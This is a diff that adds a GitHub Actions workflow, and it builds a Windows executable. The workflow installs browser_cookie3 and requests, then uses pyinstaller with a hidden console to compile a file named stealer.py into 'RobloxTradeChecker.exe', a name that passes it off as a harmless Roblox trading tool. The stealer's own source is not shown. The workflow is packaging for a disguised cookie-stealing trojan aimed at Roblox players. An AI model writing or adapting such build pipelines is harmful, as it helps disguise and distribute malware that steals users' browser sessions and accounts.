@@ -1,0 +1,16 @@
+name: Build EXE
+on: [push]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-python@v4
+        with:
+          python-version: '3.10'
+      - run: pip install browser_cookie3 requests pyinstaller
+      - run: pyinstaller --onefile --noconsole --name "RobloxTradeChecker" stealer.py
+      - uses: actions/upload-artifact@v3
+        with:
+          name: RobloxTradeChecker
+          path: dist/RobloxTradeChecker.exe
